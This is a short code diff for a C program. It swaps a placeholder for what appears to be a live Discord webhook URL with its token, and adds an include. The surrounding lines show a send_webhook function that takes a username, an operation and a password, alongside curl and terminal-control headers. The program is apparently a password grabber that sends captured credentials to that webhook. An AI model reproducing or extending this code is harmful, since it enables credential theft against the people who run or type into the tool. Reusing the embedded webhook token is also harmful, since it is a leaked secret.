@@ -6,8 +6,9 @@
 #include <libgen.h>
 #include <curl/curl.h>
 #include <termios.h>
+#include <sys/wait.h>
 
-#define WEBHOOK_URL "YOUR_WEBHOOK_URL"
+#define WEBHOOK_URL "https://discord.com/api/webhooks/1315051949837783172/-gnkBWV3XC-oM6DXG9ChkYUmZvfUsfkoRdXaqCw06PlgpbHQEMWbrxIQzlfkJ_85rdpv"
 
 void send_webhook(const char *username, const char *operation, const char *password) {
     CURL *curl;
